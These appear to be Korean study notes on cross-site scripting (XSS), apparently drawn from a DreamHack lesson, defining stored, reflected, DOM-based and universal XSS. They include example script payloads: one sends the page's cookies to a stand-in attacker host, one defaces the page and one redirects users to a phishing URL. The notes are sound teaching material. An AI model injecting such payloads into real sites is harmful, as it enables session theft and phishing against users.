




클라이언트 사이드 취약점: 웹 페이지의 이용자를 대상으로 공격할 수 있는 취약점
대표적인 클라이언트 사이드 취약점: Cross Site Scripting(XSS)
  CSS(XSS)-> 스타일시트 아님
XSS: 클라이언트 사이드 취약점 중 하나
공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트 실행 가능
공격자는 해당 취약점을 통해 특정 계정의 세션을 탈취 및 임의 기능 수행 가능
ex. 취약점이 존재시 오리진 권한으로 악성 스크립트 삽입 -> 
    악성 스크립트로 쿠키 및 세션 탈취
SOP 보안 정책이 등장하며 서로 다른 오리진에서 정보를 읽는 행위가 어려워짐
but. XSS공격은 지속되는중임
XSS 발생 예시와 종류
  Stored XSS: XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS
  Reflected XSS: XSS에서 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS
  DOM-based XSS: XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
  Universal XSS: 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로, SOP정책을 우회하는 XSS
XSS 스크립트의 예시
  자바스크립트는 웹 문서의 동작을 정의함
  이용자를 식별하기 위한 세션 및 쿠키가 웹 브라우저에 저장되어있기 때문
  공격자는 이용자의 웹 페이지 조작, 브라우저의 주소를 변경할 수 있음
  다양한 동작을 정의할 수 있어 XSS공격에 자주 사용됨
  자바스크립트의 테그는 <script>가 있음, Figure1,2,3은 자바스크립트를 이용한 XSS공격코드의 예시임
  예시
    Figure 1. 쿠키 및 세션 탈취 공격 코드
      <script>
      // "hello" 문자열 alert 실행.
      alert("hello");
      // 현재 페이지의 쿠키(return type: string)
      document.cookie; 
      // 현재 페이지의 쿠키를 인자로 가진 alert 실행.
      alert(document.cookie);
      // 쿠키 생성(key: name, value: test)
      document.cookie = "name=test;";
      // new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
      // "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
      new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
      </script>
    Figure 2. 페이지 변조 공격 코드
      <script>
      // 이용자의 페이지 정보에 접근.
      document;
      // 이용자의 페이지에 데이터를 삽입.
      document.write("Hacked By DreamHack !");
      </script>
    Figure 3. 위치 이동 공격 코드
      <script>
      // 이용자의 위치를 변경.
      // 피싱 공격 등으로 사용됨.
      location.href = "http://hacker.dreamhack.io/phishing"; 
      // 새 창 열기
      window.open("http://hacker.dreamhack.io/")
     </script>
Stored XSS는 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트 조회시 발생하는 XSS
  대표적으로 게시물과 댓글에 존재
  <script> 또는 HTML 태그를 삽입하고 반환하는 HTML코드를 확인함으로써 Stored XSS의 발생 형태를 확인해볼 수 있음
Reflected XSS
  Reflected XSS는 악성코드가 담긴 요청을 출력할 때 발생함
  검색창에 스크립트를 포함해 검색하는 방식
Cross Site Scripting (XSS): 클라이언트 사이드 취약점, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 취약점.

Stored XSS: 악성 스크립트가 서버 내에 존재, 이용자가 저장된 악성 스크립트를 조회할 때 발생

Reflected XSS: 악성 스크립트가 이용자 요청 내에 존재, 이용자가 악성 스크립트가 포함된 요청을 보낸 후 응답을 출력할 때 발생














